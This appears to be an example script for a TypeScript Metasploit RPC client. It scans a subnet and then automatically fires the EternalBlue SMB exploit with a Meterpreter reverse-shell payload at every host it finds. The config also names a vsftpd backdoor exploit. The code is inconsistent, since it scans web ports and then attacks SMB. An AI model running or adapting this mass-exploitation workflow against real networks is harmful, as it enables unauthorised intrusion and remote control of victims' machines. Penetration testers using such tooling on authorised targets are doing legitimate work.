// automate_workflow.ts - Example: Automated scan and exploitation workflow
import { MetasploitClient } from '../src/index';

const CONFIG = {
  // Edit these configuration values for your setup
  password: 'your_very_secret_password',
  server: '127.0.0.1',
  port: 55553,
  username: 'msf',
  ssl: true,
  // If you want to test a specific exploit against a target
  target: {
    exploit: 'unix/ftp/vsftpd_234_backdoor',
    payload: 'cmd/unix/interact',
    host: '192.168.1.123',
    port: 21
  }
};

(async () => {
  const client = new MetasploitClient({ 
    password: CONFIG.password,
    server: CONFIG.server,
    port: CONFIG.port,
    username: CONFIG.username,
    ssl: CONFIG.ssl,
  });
  try {
    await client.login();
    console.log('Logged in');

    // Step 1: TCP port scan for HTTP and HTTPS
    const scanner = await client.modules.use('auxiliary', 'scanner/portscan/tcp');
    scanner.setOption('RHOSTS', '192.168.1.0/24');
    scanner.setOption('PORTS', '80,443');
    const scanResult = await scanner.execute();
    console.log('Scan results:', scanResult);

    // Step 2: Exploit each discovered host with a payload
    if (scanResult.hosts && Array.isArray(scanResult.hosts)) {
      for (const host of scanResult.hosts) {
        console.log(`Processing host: ${host}`);
        const exploit = await client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue');
        exploit.setOption('RHOSTS', host);
        
        const payload = await client.modules.use('payload', 'windows/meterpreter/reverse_tcp');
        payload.setOption('LHOST', 'YOUR_LHOST');
        payload.setOption('LPORT', 4444);

        const result = await exploit.execute({ payload });
        console.log(`Launched exploit on ${host}: job=${result.job_id}, uuid=${result.uuid}`);
      }
    } else {
      console.log('No HTTP/HTTPS hosts found to exploit');
    }

    // Step 3: List active sessions
    const sessions = await client.sessions.list();
    console.log('Active sessions:', Object.keys(sessions));

  } catch (error) {
    console.error('Error in automate_workflow example:', error);
  } finally {
    await client.logout();
    console.log('Logged out');
  }
})(); 